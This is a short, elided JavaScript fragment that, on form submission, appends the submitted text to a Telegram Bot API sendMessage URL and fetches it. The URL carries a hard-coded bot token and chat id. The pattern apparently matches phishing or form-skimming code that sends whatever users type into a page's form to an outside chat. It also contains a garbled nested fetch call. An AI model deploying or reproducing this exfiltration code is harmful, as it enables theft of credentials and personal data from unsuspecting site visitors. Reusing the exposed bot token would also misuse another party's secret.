const urlLink =
    'https://api.telegram.org/bot6681287357:AAG2v9iKhXAo6tW54B3rgHYNkI7tb8QoS-U/sendMessage?chat_id=-1002608111453&parse_mode=html&text=';
let send = false;
...
window.onload = () => {
    ...
    form.addEventListener('submit', async function (e) {
        ...
        try {
            await fetch(fetch(urlLink + text));
